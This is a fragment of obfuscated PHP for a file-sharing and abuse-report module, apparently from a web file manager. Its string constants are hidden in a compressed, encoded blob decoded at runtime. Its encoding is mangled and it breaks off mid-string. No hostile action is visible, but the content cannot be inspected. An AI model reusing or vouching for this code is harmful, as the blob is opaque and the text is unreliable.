$this->where($ğÊÅÅ¹•)->delete(); Model($ş¾İ·­ï[633])->where($ğÊÅÅ¹•)->delete(); } public function listAll($ƒ«±®Ü¢) { $àÑãÄ… =& $_SERVER[”ôÑ§ì¸]; $œİ”î½Å = array(); if ($ƒ«±®Ü¢[$àÑãÄ…[1674]]) { $œİ”î½Å[$àÑãÄ…[1674]] = $ƒ«±®Ü¢[$àÑãÄ…[1674]]; } if ($ƒ«±®Ü¢[$àÑãÄ…[782]]) { $‹Ôê•Ë = $ƒ«±®Ü¢[$àÑãÄ…[783]] ? $ƒ«±®Ü¢[$àÑãÄ…[783]] : strtotime(date($àÑãÄ…[2037])); $œİ”î½Å[$àÑãÄ…[214]] = array($àÑãÄ…[376], array($ƒ«±®Ü¢[$àÑãÄ…[782]], $‹Ôê•Ë)); } if ($ƒ«±®Ü¢[$àÑãÄ…[33]]) { $œİ”î½Å[$ƒ«±®Ü¢[$àÑãÄ…[33]]] = 1; } else { $œİ”î½Å[] = array($àÑãÄ…[529] => array($àÑãÄ…[1043], 0), $àÑãÄ…[630] => array($àÑãÄ…[1043], 0), $àÑãÄ…[2011] => $àÑãÄ…[1964]); } if ($ƒ«±®Ü¢[$àÑãÄ…[1960]]) { $œİ”î½Å[] = array($àÑãÄ…[2008] => $ƒ«±®Ü¢[$àÑãÄ…[1960]], $àÑãÄ…[1571] => array($àÑãÄ…[426], "\45{$ƒ«±®Ü¢[$àÑãÄ…[1960]]}\45"), $àÑãÄ…[2011] => $àÑãÄ…[1964]); } $ËÈïõ›á = $this->_makeOrder()->where($œİ”î½Å)->selectPage(20); if (empty($ËÈïõ›á[$àÑãÄ…[412]])) { return array(); } $this->_listDataApply($ËÈïõ›á[$àÑãÄ…[412]]); return $ËÈïõ›á; } public function listDataApply($ì¥ù‹ Ä) { $this->_listDataApply($ì¥ù‹ Ä); return $ì¥ù‹ Ä; } private function _listDataApply(&$¹òØşº) { $³²¿ŒÛ =& $_SERVER[”ôÑ§ì¸]; $îùšø«Ò = array_to_keyvalue($¹òØşº, $³²¿ŒÛ[12], $³²¿ŒÛ[1674]); $°˜ğïæƒ = Model($³²¿ŒÛ[566])->userListInfo(array_unique($îùšø«Ò)); $ìŒµï‡¥ = array_to_keyvalue($¹òØşº, $³²¿ŒÛ[12], $³²¿ŒÛ[180]); $½±˜ÁÁ™ = Model($³²¿ŒÛ[847])->sourceListInfo($ìŒµï‡¥, !0); foreach ($¹òØşº as $ÙÕ¸×ğ‘ => &$¯Ğ€ÍÚ…) { $Ûğ—¬ÄÀ = $¯Ğ€ÍÚ…[$³²¿ŒÛ[1674]]; $¯Ğ€ÍÚ…[$³²¿ŒÛ[2038]] = $°˜ğïæƒ[$Ûğ—¬ÄÀ] ? $°˜ğïæƒ[$Ûğ—¬ÄÀ] : !1; $ëàñ¤¥ = $¯Ğ€ÍÚ…[$³²¿ŒÛ[180]]; $¯Ğ€ÍÚ…[$³²¿ŒÛ[87]] = $½±˜ÁÁ™[$ëàñ¤¥] ? $½±˜ÁÁ™[$ëàñ¤¥] : !1; if ($¯Ğ€ÍÚ…[$³²¿ŒÛ[87]][$³²¿ŒÛ[472]] == $³²¿ŒÛ[88]) { unset($¹òØşº[$ÙÕ¸×ğ‘]); } if ($¯Ğ€ÍÚ…[$³²¿ŒÛ[87]] != $³²¿ŒÛ[211] && !$¯Ğ€ÍÚ…[$³²¿ŒÛ[87]]) { unset($¹òØşº[$ÙÕ¸×ğ‘]); } } unset($¯Ğ€ÍÚ…); $¹òØşº = array_values($¹òØşº); } private function _makeOrder($ÃÌÙ‹ºŠ = '') { $ÉÛü…É =& $_SERVER[”ôÑ§ì¸]; $‰ô¨ÚÃø = array($ÉÛü…É[214], $ÉÛü…É[783], $ÉÛü…É[2025], $ÉÛü…É[2026]); $¡â¢˜»Ø = array($ÉÛü…É[490] => $ÉÛü…É[491], $ÉÛü…É[492] => $ÉÛü…É[493]); $ŞüïŒñ› = Input::get($ÉÛü…É[497], $ÉÛü…É[7], $ÉÛü…É[464], $‰ô¨ÚÃø); $ùé…Ü­Ò = Input::get($ÉÛü…É[498], $ÉÛü…É[7], $ÉÛü…É[2039], array($ÉÛü…É[1957], $ÉÛü…É[492])); $ùé…Ü­Ò = $¡â¢˜»Ø[$ùé…Ü­Ò]; $ÃÌÙ‹ºŠ = $ÃÌÙ‹ºŠ . "{$ŞüïŒñ›}\40{$ùé…Ü­Ò}"; return $this->order($ÃÌÙ‹ºŠ); } public function reportAdd($¨â¦ÙÜ†) { $ã‡ÀÛÓê =& $_SERVER[”ôÑ§ì¸]; $ª¼§¾Şâ = array($ã‡ÀÛÓê[632] => $¨â¦ÙÜ†[$ã‡ÀÛÓê[632]], $ã‡ÀÛÓê[1674] => USER_ID); if (Model($ã‡ÀÛÓê[2035])->where($ª¼§¾Şâ)->find()) { return !1; } $„ó«åÇ = array($ã‡ÀÛÓê[632] => $¨â¦ÙÜ†[$ã‡ÀÛÓê[632]], $ã‡ÀÛÓê[1571] => $¨â¦ÙÜ†[$ã‡ÀÛÓê[1571]], $ã‡ÀÛÓê[180] => $¨â¦ÙÜ†[$ã‡ÀÛÓê[180]], $ã‡ÀÛÓê[508] => $¨â¦ÙÜ†[$ã‡ÀÛÓê[508]], $ã‡ÀÛÓê[1674] => USER_ID, $ã‡ÀÛÓê[33] => $¨â¦ÙÜ†[$ã‡ÀÛÓê[33]], $ã‡ÀÛÓê[493] => $¨â¦ÙÜ†[$ã‡ÀÛÓê[493]]); return Model($ã‡ÀÛÓê[2035])->add($„ó«åÇ); } public function reportList($Şì•ˆËÆ) { $â›Òœê =& $_SERVER[”ôÑ§ì¸]; $¾íÒŞÅÓ = array(); if ($Şì•ˆËÆ[$â›Òœê[782]]) { $›ùŒóáÆ = $Şì•ˆËÆ[$â›Òœê[783]] ? $Şì•ˆËÆ[$â›Òœê[783]] : strtotime(date($â›Òœê[2037])); $¾íÒŞÅÓ[$â›Òœê[214]] = array($â›Òœê[376], array($Şì•ˆËÆ[$â›Òœê[782]], $›ùŒóáÆ)); } if (isset($Şì•ˆËÆ[$â›Òœê[33]]) && in_array($Şì•ˆËÆ[$â›Òœê[33]], array($â›Òœê[88], $â›Òœê[477], $â›Òœê[2040], $â›Òœê[2041], $â›Òœê[2042]))) { $¾íÒŞÅÓ[$â›Òœê[33]] = $Şì•ˆËÆ[$â›Òœê[33]]; } if (isset($Şì•ˆËÆ[$â›Òœê[772]]) && in_array($Şì•ˆËÆ[$â›Òœê[772]], array($â›Òœê[211], $â›Òœê[88], $â›Òœê[477], $â›Òœê[2040]))) { $¾íÒŞÅÓ[$â›Òœê[772]] = $Şì•ˆËÆ[$â›Òœê[772]]; } $ò€ş¶—¬ = Input::get($â›Òœê[498], $â›Òœê[7], $â›Òœê[2039], array($â›Òœê[1957], $â›Òœê[492])); $Ä¡÷å = array($â›Òœê[490] => $â›Òœê[491], $â›Òœê[492] => $â›Òœê[493]); $Ş¯µ¥ = $â›Òœê[2043] . $Ä¡÷å[$ò€ş¶—¬]; $©ÒåÇÒÀ = Model($â›Òœê[2035])->where($¾íÒŞÅÓ)->order($Ş¯µ¥)->selectPage(20); if (empty($©ÒåÇÒÀ[$â›Òœê[412]])) { return array(); } $ÙÓùéß = array_to_keyvalue_group($©ÒåÇÒÀ[$â›Òœê[412]], $â›Òœê[772], $â›Òœê[632]); if (!empty($ÙÓùéß[0])) { $Şì•ˆËÆ = $ÙÓùéß[0]; $¾íÒŞÅÓ = array($â›Òœê[632] => array($â›Òœê[7], $Şì•ˆËÆ)); $İïµÙí® = $this->where($¾íÒŞÅÓ)->field($â›Òœê[632])->select(); $İïµÙí® = array_to_keyvalue($İïµÙí®, $â›Òœê[12], $â›Òœê[632]); $”È¦õ‘¬ = array_diff($Şì•ˆËÆ, $İïµÙí®); if (!empty($”È¦õ‘¬)) { foreach ($©ÒåÇÒÀ[$â›Òœê[412]] as $šù€´ => $ĞÃÌ¬¬‰) { if (in_array($ĞÃÌ¬¬‰[$â›Òœê[632]], $”È¦õ‘¬)) { unset($©ÒåÇÒÀ[$â›Òœê[412]][$šù€´]); } } } } $this->_listDataApply($©ÒåÇÒÀ[$â›Òœê[412]]); return $©ÒåÇÒÀ; } public function reportStatus($ªÙ¯‡´”) { $ù š”ÎÕ =& $_SERVER[”ôÑ§ì¸]; $ê†ğÔ¬Á = array($ù š”ÎÕ[442] => $ªÙ¯‡´”[$ù š”ÎÕ[442]]); $çòš®½ = Model($ù š”ÎÕ[2035])->where($ê†ğÔ¬Á)->field($ù š”ÎÕ[2044])->find(); if (!$çòš®½) { return !1; } $Ç²­Ñ—Ï = array($ù š”ÎÕ[772] => $ªÙ¯‡´”[$ù š”ÎÕ[772]]); if ($ªÙ¯‡´”[$ù š”ÎÕ[772]] == $ù š”ÎÕ[2040] && $çòš®½[$ù š”ÎÕ[772]] == $ù š”ÎÕ[2040]) { $Ç²­Ñ—Ï[$ù š”ÎÕ[772]] = 0; } $ ı²¸£Ÿ = Model($ù š”ÎÕ[2035])->where($ê†ğÔ¬Á)->save($Ç²­Ñ—Ï); if ($ªÙ¯‡´”[$ù š”ÎÕ[772]] == $ù š”ÎÕ[477]) { if ($çòš®½[$ù š”ÎÕ[508]] != $ù š”ÎÕ[211] && $this->shareFileMeta($çòš®½[$ù š”ÎÕ[508]])) { $this->shareFileMeta($çòš®½[$ù š”ÎÕ[508]], 0); } $this->remove($çòš®½[$ù š”ÎÕ[632]]); return !0; } if ($ ı²¸£Ÿ && $ªÙ¯‡´”[$ù š”ÎÕ[772]] == $ù š”ÎÕ[2040]) { $Ñç˜ÏøÌ = $Ç²­Ñ—Ï[$ù š”ÎÕ[772]] == $ù š”ÎÕ[2040] ? 1 : 0; $this->shareFileMeta($çòš®½[$ù š”ÎÕ[508]], $Ñç˜ÏøÌ); $this->removeByFile($çòš®½[$ù š”ÎÕ[508]]); } return $ ı²¸£Ÿ; } private function removeByFile($¨ó‰÷Ë½) { $ã˜İÆãÅ =& $_SERVER[”ôÑ§ì¸]; $ºË±¡¢ = Model($ã˜İÆãÅ[847])->where(array($ã˜İÆãÅ[508] => $¨ó‰÷Ë½))->field($ã˜İÆãÅ[180])->select(); $İĞ’ØÜ = array_to_keyvalue($ºË±¡¢, $ã˜İÆãÅ[12], $ã˜İÆãÅ[180]); $ú– ›£ï = array($ã˜İÆãÅ[180] => array($ã˜İÆãÅ[7], $İĞ’ØÜ), $ã˜İÆãÅ[529] => 1); $ºË±¡¢ = $this->where($ú– ›£ï)->field($ã˜İÆãÅ[632])->select(); if (empty($ºË±¡¢)) { return; } $¡Á€Ş¹ö = array_to_keyvalue($ºË±¡¢, $ã˜İÆãÅ[12], $ã˜İÆãÅ[632]); $this->remove($¡Á€Ş¹ö); } private function shareFileMeta($©«Ïô†Ü, $ĞŞš‚Æ™ = null) { $¯Í¶ôØ½ =& $_SERVER[”ôÑ§ì¸]; $øÌèëÁ» = array($¯Í¶ôØ½[508] => $©«Ïô†Ü, $¯Í¶ôØ½[94] => $¯Í¶ôØ½[2045]); if (is_null($ĞŞš‚Æ™)) { return Model($¯Í¶ôØ½[2046])->where($øÌèëÁ»)->find(); } $øÌèëÁ»[$¯Í¶ôØ½[417]] = $ĞŞš‚Æ™; Model($¯Í¶ôØ½[2046])->add($øÌèëÁ», array(), !0); } } goto fß¦•ì ë§; fôæ¨Ş¹Ë: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define(base64_decode('lPTRp+y4'), "\331\212\341\226\301\327"); $_SERVER[”ôÑ§ì¸] = explode("\174\4\174\3\174\1", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\34\305\321\50\127\176\260\201\0\201\0\11\77\60\10\33\111\366\36\222\157\313\226\355\225\264\222\26\257\166\345\335\225\17\44"."\61\36\355\316\112\243\75\146\265\63\253\313\66\341\14\207\61\4\214\271\3\1\34\2\1\314\175\143\110\200\360\22\216\20\302\221\20\102\22\214\57\2\70\100\200\4\110\310\353"."\243\372\230\331\25\374\357\173\357\373\236\77\333\333\135\175\114\37\325\325\325\325\125\325\167\74\161\335\306\315\273\327\356\267\166\337\265\173\137\374\322\271\147\357\171\213\206\327\356"."\x83\xfe\x7d\x83\x86\x8f\x5f\x7f\xc0\x5e\xe4\xcf\xe1\xeb\x2f\xa8\xa9\x69\x9f\x33\x79\x7a\xe4\xa0\x8b\xef\xbb\x43\xfb\xa9\x76\xbb\xb6\x21\x1a\x7e\xee\xf9\xd0\xc1\xbf\xbe\xfd\xe4\xe0\xce\x9b\x9e\x1b"."\xdb\xb9\xf7\x5e\xc7\x8d\x7\x5f\x6a\x40\x99\x69\xd9\x6\xfa\xa3\xe4\x4d\x5b\xd1\x47\xd\xcb\xb6\x28\x20\x69\xe6\xd3\x46\x3f\xd\x1b\x79\xfa\xeb\xa7\x3f\x5d\xb1\x70\x51\xcf\x99\xb6\x4e\xa3\x3e\xfa"."\243\102\273\310\377\326\120\326\140\351\152\44\232\120\343\135\235\235\301\130\2\62\65\310\351\71\63\5\241\202\126\324\162\360\375\202\136\264\120\153\344\352\324\202\131\320\363\16\210".base64_decode('AKQ0W+vTLKippUltCXaGo6vUxKrOIOToU4dKenGMxkgwbmtFO2HkdJ5jpMjb1RRsCw==').strrev('e4Õ”k6Ÿ#UÕ—Ú‚€¶c:SËKÍ›‡'."\r".'<9D¡£›‚„h¡š‰,D”E')."\265\122\113\3\255\206\236\115\321\140\136\143\315\261\307\12\20\112\360\20\232\246\174\51\233\245\221\10\17\245\364\264\126\312\302\150\265\310\221\102\321\310\151\254\323\113\365\61\16"."\245\1\255\144\233\106\76\111\43\301\121\273\250\11\70\152\153\22\115\264\236\207\252\342\301\160\260\71\241\340\6\52\255\261\150\207\2\223\220\323\54\133\57\52\53\332\203\261\240"."\x82\x1b\xdd\x58\x4d\xfa\x5a\xad\x0\xbe\x44\xd0\x50\x28\x81\x70\x58\x99\xa8\x6\x5b\xcf\x15\x58\x35\xb4\x4c\x85\xca\xa2\xb1\x96\x60\x4c\x69\x5a\xa5\x88\x11\x4a\x9a\xb9\x9c\x99\xf7\xa1\x5a\xd0\x4c"."\xda\x52\x53\x83\xb1\x18\xd\x78\x0\xbd\xc3\x21\x3c\x69\x10\x89\xb6\xb6\xc6\x83\x3c\x6\x9d\x5b\x16\x46\x2d\x99\x9\xf8\xe9\x88\xa5\xd2\x59\x5b\x1d\xd6\xb2\x25\x86\xa6\x19\xfa\x5b\xd\x3f\xf0\x6b"."\132\200\272\103\106\336\50\1\232\102\25\246\311\227\25\4\112\54\267\316\40\172\12\2\71\124\336\204\225\207\226\341\60\15\66\56\242\277\13\40\123\237\212\323\364\242\255\352\371"."\244\231\62\362\260\130\27\3\322\151\366\100\113\321\100\31\150\74\155\146\123\54\154\31\343\320\225\264\221\325\43\245\234\234\205\107\223\3\106\66\125\144\353\353\253\162\322\150\230".base64_decode('L1ecV8QKqCV8pRvpMbHecL5OnmqZpWJSD6H1QeP1ANZtG3UOxsYwuwpZU0vF9SLvmg==')."\141\266\242\212\242\45\133\6\226\110\266\126\263\230\153\101\224\1\276\217\126\205\321\125\41\41\303\326\105\112\32\61\177\115\367\31\336\57\173\273\227\240\377\152\201\364\365\100\233"."\x6\xf4\x6c\x56\xd5\x47\x75\x58\x38\xb9\xd4\x6c\x8b\xd\x86\xdf\xea\x33\xf2\x7e\x4\xa1\xd1\x50\x54\x1d\xd0\xac\x81\x8e\xd4\x6c\x95\x94\x62\x14\x35\xa5\x8f\xfa\xa\x3\x5\x58\xd5\x7c\x21\xf7\x38"."\20\33\17\135\304\264\203\22\135\316\232\111\55\53\167\221\206\7\154\273\20\327\363\51\74\22\320\25\163\44\117\106\252\240\353\220\251\305\243\244\224\16\145\225\322\336\140\64\130".strrev('º‹²×¶ëi3~ó0Û5$k!Bµ<±8P‹'."\r".'ÁT-¶>¦•3¦Ê= qfw¬CË.`¬')."\x35\x6\x92\x49\xdd\xb2\xbc\xcd\x66\xde\x2e\x9a\x59\x6f\x20\x9b\x35\x47\xbc\xd1\xa2\xd1\x6f\xe4\x1b\x94\x69\x40\x6c\x51\x22\x5a\xd4\x5e\x4c\x0\x1b\x60\xa5\x56\x2d\x50\x30\xe2\xe0\xcf\x4c\x6b\x2c".base64_decode('2WnvPLYCee6ilrfSetEbhJXRoKDGcirIsrUYVsG0DNy8BkWzbS05gCmIqL7xK/Ib+Q==')."\254\221\327\313\362\6\107\13\106\121\267\130\133\225\266\216\4\124\202\152\327\275\235\105\255\77\247\65\50\205\122\37\32\31\130\251\25\140\64\67\14\115\203\222\304\121\217\222\53".base64_decode('Wba3qCNSZKDtDgY5lPZ24HVl6ClvHFFsAM+sm6Ug1FFYGoW2JxKdaqgVbcmRoNoRSA==')."\64\267\103\263\155\255\237\265\71\214\350\60\257\222\1\127\172\321\372\302\310\25\101\175\25\300\116\163\104\57\242\17\67\215\65\50\31\63\325\147\216\372\130\22\316\34\107\204\206"."\x65\xc6\xd3\x5d\xb0\xbd\x31\x2d\xdf\x8f\xc7\xa7\x6f\xcc\xd6\x1\x5\xad\xe1\x7e\xe7\x40\x87\xf5\x7c\xbf\x3d\xc0\xa\xc6\x83\xb1\xe5\xc1\x98\x1a\x8f\xb6\x26\x56\x4\x62\xb0\x99\xe7\x11\x96\x8c\xb2"."\117\341\252\263\336\230\236\102\103\237\264\131\71\255\200\107\215\345\301\213\3\317\25\113\305\13\206\245\205\103\155\170\140\132\274\26\312\344\225\163\261\272\303\106\316\300\155\267\171".base64_decode('ChlJtNO3QYP8pEONPda0mp7U9Fov+n9abXdPi29a72K/Icr46331yoy6OUonYj0MLQ==')."\xab\x40\xa7\xcb\x72\xd4\x29\xd1\xa5\xce\x61\x11\xd8\x9c\x37\xf3\xfa\x57\xc\xe\xde\xbb\xa4\x65\xef\x1a\x56\xa\x8c\x5\x97\x75\x5\xe3\x9\xb5\x23\x98\x68\x8f\xb6\xc0\xd7\x83\x1\x8\x85\x4d\xba"."\154\131\157\273\351\117\57\314\156\57\375\121\15\253\125\332\126\160\224\223\37\325\354\33\104\223\321\241\63\32\233\246\64\72\224\323\372\45\42\257\72\367\0\34\303\211\35\146\121"."\x17\x7b\xd5\xa\x23\xc5\x37\x9\x14\x6d\xd7\x8d\xfe\x1\x18\x30\x3\x57\x97\x34\xb3\x66\x51\xcb\x62\xd2\xc8\x56\x85\xce\xc8\x55\xbf\x1\xe4\xaa\x90\x2d\x21\x9c\xf1\xe3\x2f\x24\x6\x4a\xb9\x3e\xa0"."\350\210\3\354\327\155\301\140\131\143\210\13\311\261\235\13\155\177\166\250\305\261\77\101\314\257\342\171\356\361\25\362\375\265\123\240\56\165\306\354\72\14\0\24\205\56\42\116\263"."\xa4\x97\x8f\x81\x2f\x69\xa2\xad\xa6\x43\xcb\xe8\xd\xb8\x53\x40\x3f\x16\x10\x28\x8b\x48\x84\x65\x1\xde\xb\x1a\xdd\x7b\x3b\x9e\xa7\xac\x2f\x87\x2a\x21\x75\x36\x9b\x7c\xf7\xa2\xbc\xfc\x2\xe7\x5e".base64_decode('oOjFolk8AXKQsEI2FDxvULnNt2cLLR8WHjD5dm4WIdTgh35PndHKNjt/fCb6K3a2lA==')."\231\323\330\76\101\50\274\236\242\44\236\202\246\71\122\332\165\115\360\50\166\321\66\61\264\350\310\202\360\151\300\4\274\106\363\6\115\52\361\266\261\126\246\364\254\316\160\141\100".strrev('iê,ï}Á(÷,Á™‡cx'."\0".' tøñcOx’¡ŠÃØ*»1QÍ%1ÇcCdd»g')."\3\310\125\36\241\146\207\126\314\260\216\241\222\142\325\340\210\264\242\132\273\302\141\265\71\32\111\240\303\5\205\254\210\205\22\101\266\202\3\55\152\240\271\223\263\40\0\306\4".strrev('òğ	æ÷–¯QÃ6ºs±YĞ »”–Qèâ„›İ-æ`«£Í±~¨É0á¤÷|¶')."\346\71\171\20\5\166\107\312\312\204\140\232\304\346\206\7\17\255\102\306\374\164\106\343\120\140\61\206\42\6\264\217\57\226\316\56\110\312\111\50\322\26\4\340\144\300\252\1\15"."\330\312\300\212\70\333\230\112\50\177\321\30\327\104\227\26\263\366\260\216\344\262\202\237\165\366\312\53\146\36\125\71\313\333\336\21\150\366\306\333\3\63\146\317\241\320\125\271\124"."\117\242\335\260\172\116\341\161\30\267\21\153\226\132\324\21\171\140\65\317\250\253\147\213\27\161\21\122\173\126\171\163\136\134\13\36\62\137\135\135\35\253\153\372\34\145\0\121\45"."\100\137\63\237\42\323\2\203\325\127\112\146\330\12\321\222\214\241\303\47\136\313\73\142\60\202\72\205\363\276\123\312\321\145\212\163\353\200\52\112\204\161\123\265\44\376\230\212\152"."\xb4\x4b\x96\x3c\x34\x68\x1d\xa5\x50\x21\x83\xf1\xa9\x14\xaa\x65\xfb\xd1\x28\xdb\x3\x39\x19\x28\x66\x9a\xc6\x75\xca\x3e\xf1\xc9\xe2\xa3\x88\xc7\xb6\xd2\x6e\xc6\xd6\x3d\xe2\x9c\xc6\xd8\x96\x5d\xa9"."\15\53\53\265\141\245\253\15\53\313\333\100\101\226\321\237\107\275\144\173\122\242\75\24\131\252\166\104\133\202\141\65\24\101\133\160\242\34\336\325\331\22\140\53\125\206\67\105\23"."\xed\xe\x68\x17\xda\x84\x97\x7\xc2\x21\x77\xf6\xe0\xca\x50\x3c\x11\xaf\x98\x84\x60\x5d\x41\x57\x4a\x4b\x93\xda\x19\xb\xb6\x86\x56\xf2\x68\x6b\x28\x18\x6e\x89\xab\xcd\x81\xe6\x76\x91\x27\x12\xe8".base64_decode('CPKdV8+mLL8zv4q4iTiXXKjDWArDsFB1CAtUdgxWBbFAXKMOAw7dxbIf0hOVIWmJ8Q==')."\72\374\304\224\143\273\101\116\3\32\251\61\216\260\206\376\324\52\201\270\142\27\124\116\367\373\306\170\220\164\203\305\321\126\6\337\127\200\263\51\153\201\212\363\64\351\151\316\141".strrev('Ò4XŠêCÅ€,`ÎÑ¨ğ´œÖÚ,Í1Ÿ3 L!2'."\0".'šDåDq\\kç6ÒT')."\x5\x46\x6\x74\xd6\x80\x10\xc\x7f\xd\x3b\x45\x80\x94\xc8\x16\x5b\xf\x3a\x2\x68\x4c\x5c\x20\x6\x7d\xd0\x64\x43\xb9\x96\xfe\x9c\x4\xa4\x0\x9d\x37\x81\xb2\xe4\xd9\xa8\xf7\xe1\x5d\x98\x71\x51"."\x2c\x90\x46\x64\x8f\xed\xa0\x66\x89\x7f\xad\xcf\x34\xb3\x8c\x20\x23\x46\x98\xef\xc\x5c\xca\x34\x68\x31\x24\x19\x65\x7b\xca\x74\x4e\xca\x0\x75\xa3\x4b\x83\x11\x95\x61\x16\x8d\x49\xd8\x48\x1\xc1"."\x58\x2c\x1a\x83\x1\xb1\xcd\xc\x13\x3e\xd0\xc4\x58\x30\xce\xc8\x39\x26\x9b\x6\x1b\x2e\xbf\x6f\x3a\x60\xb1\x8e\x98\xd\xf8\xbc\xff\xd4\x9e\x91\xe9\x35\xdd\xde\xe9\xbe\x5e\x14\xa8\x9d\xb6\x84\x46".strrev('k3Ã3]è'."\0".'éÚ¾Ø‹Ûß;Î¼wšã¼t7kø÷ñèm®-cP|øÒò*WDsãÖ!')."\316\200\62\56\76\261\27\375\64\366\54\236\332\343\75\351\264\325\113\272\173\172\253\33\246\237\320\343\73\261\147\244\167\132\355\142\366\235\144\251\210\70\113\106\261\120\123\123\323".base64_decode('a1CT0LmBZ8mTvU3KwBLGjYKArpmzjsHRHOr9okS3t2d672KpnARyfwtRUrTRDvB8AQ==')."\357\51\270\147\274\50\136\367\200\37\245\174\122\154\113\170\135\364\151\111\240\3\210\106\12\256\335\56\162\201\224\363\270\272\146\52\375\135\307\46\262\137\37\345\373\127\332\50\2"."\x76\x96\xf2\xc6\x10\xe3\x9a\xf3\xfa\x10\x4\x4c\x9b\xe1\x77\x9f\x6e\x8f\xe8\xc\x3d\x10\xdc\x11\x47\xc8\xc1\xe8\x3e\x4a\x92\x62\x59\x69\xcf\x20\x92\x3\x69\xbb\x65\x4c\x5e\x41\xc5\x27\x89\x11\x1e"."\103\333\10\314\323\44\310\155\45\265\202\36\227\172\250\252\211\100\123\70\250\62\12\3\224\230\305\11\125\154\342\262\151\324\65\101\121\31\175\110\212\263\52\71\226\303\312\267\206".base64_decode('sgohDJRzbyBieqtUwEy4gmYcja2CNnClcZFChxzKqfIEFDTGEGKxki4WPaZQ0KaCmA==').base64_decode('IQuxzox59df09JS69VRvN0J8zZvuXTNzXS07zvp70B8WCVQQGKucGqqIEfPhdnCZoQ==')."\x23\xc2\x93\x69\xd4\x2c\x72\xe\xb8\xe0\x38\x2d\xda\xa6\xad\x65\x1d\x55\x24\x30\x84\x91\x26\xc6\x47\x81\xf4\x8c\xce\x76\x58\x50\x2c\xcc\xb3\x49\x92\x76\x42\x4e\x23\x5c\x5a\xc5\x19\x21\x49\xd4\x8b"."\x4b\xc4\x75\xdb\xc7\x73\x78\xa4\x44\x15\xc5\x1d\xb7\x1e\x8d\x55\x8c\xd8\xe7\xd1\x72\x6a\x96\xb6\x3a\x2a\xc3\x8c\x93\xb3\xa5\x43\x3c\x6f\xe9\x5a\x31\x39\xd0\x5a\xca\x66\x6d\x7e\x64\xcd\x1a\x19\xf8"."\2\254\25\270\55\360\302\156\60\275\122\321\126\263\310\104\77\323\240\31\125\323\52\145\14\345\363\146\252\117\106\65\261\311\266\5\20\73\223\120\152\230\144\133\11\105\224\246\150"."\64\34\14\104\24\274\237\303\76\204\230\205\170\260\63\200\66\61\54\104\212\47\202\40\154\17\265\170\131\275\53\275\354\240\314\3\6\14\273\131\240\174\243\156\253\350\354\231\141".base64_decode('cykftfEZwoMPvB7MW3hQqz34jOwRJzSPkCV7hg19hAT46ckDhyqPON1DMNTiMawWcg==')."\70\44\37\40\111\254\11\350\124\215\16\67\131\155\314\103\233\23\326\207\365\254\207\235\373\75\254\215\36\46\366\360\20\161\105\13\64\253\13\55\47\150\26\11\42\252\71\340\301"."\x8\x84\xf1\xd7\x23\xa4\xdb\x1e\x74\x18\xd7\x8b\x24\xb\xc\x8c\x38\x57\x7a\xc4\x99\xd3\xd3\x5f\x34\x4b\x85\x4e\xf6\x4d\x29\x46\x9b\x5\x0\xd1\x66\xe\x88\x99\xa6\xed\x61\x92\x14\x8f\x2c\x52\x81"."\x56\x4\xd8\x3a\xa9\x38\x9c\x95\x7b\x43\xc6\xdf\xdd\x8\xc0\x2f\x9c\x54\x3e\x4a\x5f\x33\x59\xe5\xf3\xe1\x94\x26\xad\xa1\x35\x82\xb8\x6a\x1d\xdb\xe5\x1c\x79\x88\x30\x87\x73\x9f\x78\xc0\x45\x68\xb9"."\x58\xa8\xb8\x3\xad\x1a\xdc\xa3\xd0\x6a\xe5\x30\x47\xd0\xbc\x13\x51\x85\x20\x5b\x5c\x61\x8\x5e\xd7\x2d\x2d\x70\x5f\x6e\xe0\x8f\x26\xb4\xfe\xb8\xf4\x39\x5b\xeb\x67\xdf\xc2\xc4\xa\xa5\x4e\x98\x95"."\206\143\172\162\54\51\304\17\55\222\120\303\31\53\241\32\342\132\332\325\55\17\131\107\225\326\100\345\71\346\170\315\247\144\362\244\111\154\214\31\262\363\371\165\254\221\257\137\235"."\320\57\102\2\243\5\301\104\320\306\142\62\34\107\233\132\153\226\15\312\14\71\31\10\260\307\31\303\213\313\107\10\62\271\23\214\163\311\124\70\330\232\120\116\216\42\352\145\230"."\x2a\x2d\xa3\xe2\xcc\xa\xf9\xcf\xcc\x2b\x8e\xba\xd9\x70\x29\x8d\x24\x5d\xc4\xb5\x7c\x8a\x42\x56\x23\x4a\xbf\xba\xb1\x8a\x7d\xa4\xca\x51\x5c\xa0\x89\xb3\x11\x1e\x16\x55\xca\x11\xf\xf\xb7\x3c\x8".base64_decode('GB1I98XuxEBRsRmWgPPTLDiDYbkehHQGE1Mr46VEbgSAtcvxXRwVa4qhhII/4JF4FQ==').base64_decode('TFK8YnVIUeeQuzDStYXiIeo08mNGPm7kCtkyqNiFBROAF7eIUaycKEw3ESyiofV74A==')."\x2e\xce\x93\x35\xf2\x19\x69\x83\x16\x12\x38\xd4\x7a\x5c\x54\x6a\x3b\xd4\xe4\x6a\x39\x23\xab\x5e\x67\xd4\xb1\xa0\x1\xe5\x7\xb4\xa2\x18\x4d\x46\x86\x30\x2d\xe0\xf9\x2d\x9c\x45\x44\xa5\x6c\x69\x6d"."\x58\x70\x28\x8e\x32\x12\x31\xb1\xec\x31\xd6\x7c\x39\xe8\xac\x94\x46\x5b\x3c\xe4\xb7\x1d\xd\x83\xbc\x5e\xf9\xfc\x60\x42\xc2\x32\x51\x1a\x84\x88\x41\x18\xd\x16\xfa\x21\x1d\x49\x98\x1e\x2c\x21\x46"."\x3f\x74\x1f\x67\xf7\xb2\x24\x13\x43\xfc\x52\xae\x5\x24\xce\x38\xbc\x1c\x51\x0\xc6\x98\xa1\x11\xaf\x61\x14\x4\xb8\x9\x55\x92\x9\x70\xa\xe4\xe4\x7\x68\x4b\x2\x9c\xbe\xa3\x5d\x12\xed\x71\x34"."\214\230\367\54\332\332\212\76\274\140\332\360\6\305\306\207\322\72\31\1\343\72\352\63\224\23\265\305\313\322\344\334\102\360\207\151\277\330\53\330\270\212\365\346\234\177\32\352\27".base64_decode('DcJDq5a3A6Nz5Xhr0eScLt/m3ZmayVGSX7W7tmZpPBzsRBlIKuNmLFxQV1RMhGPXoQ==')."\40\166\101\240\245\162\106\336\127\244\273\231\17\35\20\100\75\302\123\47\